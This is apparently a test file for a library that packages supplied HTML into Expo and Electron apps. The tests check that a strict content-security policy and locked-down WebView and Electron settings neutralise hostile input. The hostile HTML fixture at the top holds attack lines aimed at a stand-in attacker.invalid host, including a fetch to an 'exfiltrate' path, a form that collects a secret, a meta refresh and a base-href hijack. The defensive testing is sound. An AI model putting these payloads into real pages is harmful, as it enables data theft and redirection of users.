import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";
import { Script } from "node:vm";
import { expoFiles, windowsFiles } from "../src/lib/expo-pack.ts";

const source = readFileSync(
  new URL("../src/lib/expo-pack.ts", import.meta.url),
  "utf8",
);

const hostileHtml = `
<script>window.__ranBeforeHelixPolicy = true</script>
<html>
  <head>
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline'">
    <meta http-equiv="refresh" content="0;url=https://attacker.invalid/escape">
    <base href="https://attacker.invalid/">
  </head>
  <body>
    <button onclick="window.open('https://attacker.invalid/popup')">Open</button>
    <form action="https://attacker.invalid/collect"><input name="secret"></form>
    <script>
      fetch('https://attacker.invalid/exfiltrate');
      localStorage.setItem('persist', 'no');
      location.href = 'https://attacker.invalid/navigate';
    </script>
  </body>
</html>`;

function extractExpoHtml(appSource) {
  const match = appSource.match(/const html = (.+);\nconst isPackagedDocument/);
  assert.ok(match, "Expo App.js must contain one serialized protected document");
  return JSON.parse(match[1]);
}

function extractCanonicalPolicy(html) {
  const match = html.match(
    /<meta http-equiv="Content-Security-Policy" data-helix-generated-policy="v1" content="([^"]+)">/,
  );
  assert.ok(match, "generated document must begin with the canonical Helix policy");
  return match[1];
}

function assertStrictProtectedDocument(html) {
  assert.match(
    html,
    /^<!doctype html><html><head><meta http-equiv="Content-Security-Policy" data-helix-generated-policy="v1"/,
  );
  const policy = extractCanonicalPolicy(html);
  assert.match(policy, /default-src 'none'/);
  assert.match(policy, /connect-src 'none'/);
  assert.match(policy, /object-src 'none'/);
  assert.match(policy, /frame-src 'none'/);
  assert.match(policy, /base-uri 'none'/);
  assert.match(policy, /form-action 'none'/);
  assert.doesNotMatch(policy, /https?:/);
  assert.match(html, /name="robots" content="noindex, nofollow/);
  assert.doesNotMatch(html, /http-equiv="refresh"/i);
  assert.ok(
    html.indexOf("data-helix-generated-policy") <
      html.indexOf("window.__ranBeforeHelixPolicy"),
    "the enforced CSP must be parsed before every byte of supplied HTML",
  );
}

test("Expo embeds only the strictly protected artifact, never raw HTML before CSP", () => {
  const files = expoFiles({
    title: "Sandbox proof",
    slug: "sandbox-proof",
    html: hostileHtml,
    bundleId: "helix.kreluna.sandboxproof",
    liveUrl: "https://attacker.invalid/not-loaded",
    platform: "android",
  });

  assertStrictProtectedDocument(extractExpoHtml(files["App.js"]));
  assert.doesNotMatch(
    files["App.js"],
    /const html = [`']\s*<script>window\.__ranBeforeHelixPolicy/,
  );
});

test("Expo WebView denies external navigation, network-capable access and persistence", () => {
  const app = expoFiles({
    title: "Restricted Expo",
    slug: "restricted-expo",
    html: "<main>Offline app</main>",
    bundleId: "helix.kreluna.restrictedexpo",
    liveUrl: "https://example.invalid/not-loaded",
    platform: "ios",
  })["App.js"];

  assert.match(app, /originWhitelist=\{\['about:blank'\]\}/);
  assert.match(app, /baseUrl: 'about:blank'/);
  assert.match(app, /onShouldStartLoadWithRequest=\{isPackagedDocument\}/);
  assert.match(app, /url === 'about:blank'[\s\S]*?url\.startsWith\('about:blank#'\)/);
  assert.match(app, /\bincognito\b/);
  assert.match(app, /cacheEnabled=\{false\}/);
  assert.match(app, /domStorageEnabled=\{false\}/);
  assert.match(app, /sharedCookiesEnabled=\{false\}/);
  assert.match(app, /thirdPartyCookiesEnabled=\{false\}/);
  assert.match(app, /allowFileAccess=\{false\}/);
  assert.match(app, /allowFileAccessFromFileURLs=\{false\}/);
  assert.match(app, /allowUniversalAccessFromFileURLs=\{false\}/);
  assert.match(app, /mixedContentMode="never"/);
  assert.match(app, /javaScriptCanOpenWindowsAutomatically=\{false\}/);
  assert.match(app, /setSupportMultipleWindows=\{false\}/);
  assert.match(app, /geolocationEnabled=\{false\}/);
  assert.match(app, /webviewDebuggingEnabled=\{false\}/);
  assert.doesNotMatch(app, /originWhitelist=\{\[[^\]]*https?:/);
});

test("Electron packages the same strict CSP document and no raw index.html", () => {
  const files = windowsFiles({
    title: "Sandbox proof",
    slug: "sandbox-proof",
    html: hostileHtml,
    liveUrl: "https://attacker.invalid/not-loaded",
  });

  assertStrictProtectedDocument(files["index.html"]);
  assert.notEqual(files["index.html"], hostileHtml);
  assert.doesNotThrow(() => new Script(files["main.js"], { filename: "main.js" }));
  assert.doesNotMatch(files["main.js"], /loadURL\(['"]https?:/);
  assert.doesNotMatch(files["main.js"], /shell\.openExternal/);
});

test("Electron renderer, session, permissions and navigation are fail-closed", () => {
  const files = windowsFiles({
    title: "Restricted desktop",
    slug: "restricted-desktop",
    html: "<main>Offline app</main>",
    liveUrl: "https://example.invalid/not-loaded",
  });
  const main = files["main.js"];

  for (const preference of [
    /sandbox:\s*true/,
    /contextIsolation:\s*true/,
    /nodeIntegration:\s*false/,
    /nodeIntegrationInWorker:\s*false/,
    /nodeIntegrationInSubFrames:\s*false/,
    /webviewTag:\s*false/,
    /webSecurity:\s*true/,
    /allowRunningInsecureContent:\s*false/,
    /navigateOnDragDrop:\s*false/,
    /devTools:\s*false/,
  ]) {
    assert.match(main, preference);
  }

  assert.match(main, /session\.fromPartition\(ISOLATED_PARTITION, \{ cache: false \}\)/);
  assert.doesNotMatch(main, /persist:/);
  assert.match(main, /appendSwitch\('disable-local-storage'\)/);
  assert.match(main, /clearStorageData\(\)/);
  assert.match(main, /clearCache\(\)/);
  assert.match(main, /setPermissionCheckHandler\(\(\) => false\)/);
  assert.match(main, /setPermissionRequestHandler[\s\S]*?callback\(false\)/);
  assert.match(main, /setDevicePermissionHandler\(\(\) => false\)/);
  assert.match(main, /will-download[\s\S]*?event\.preventDefault\(\)/);
  assert.match(main, /webRequest\.onBeforeRequest/);
  assert.match(main, /callback\(\{ cancel: !allowed \}\)/);
  assert.match(main, /setWindowOpenHandler\(\(\) => \(\{ action: 'deny' \}\)\)/);
  assert.match(main, /will-navigate/);
  assert.match(main, /will-redirect/);
  assert.match(main, /will-attach-webview[\s\S]*?event\.preventDefault\(\)/);
  assert.match(main, /await win\.loadURL\(trustedPage\)/);
  assert.equal(files["preload.js"].includes("contextBridge"), false);
});

test("packaging source applies protectGeneratedHtml to both wrappers", () => {
  assert.match(source, /import \{ protectGeneratedHtml \}/);
  assert.match(source, /return protectGeneratedHtml\(html, \{/);
  assert.match(source, /allowlist:\s*\{\}/);
  assert.equal((source.match(/const protectedHtml = protectPackagedHtml\(input\.html\)/g) ?? []).length, 2);
  assert.match(source, /"index\.html": protectedHtml/);
  assert.match(source, /JSON\.stringify\(protectedHtml\)/);
});
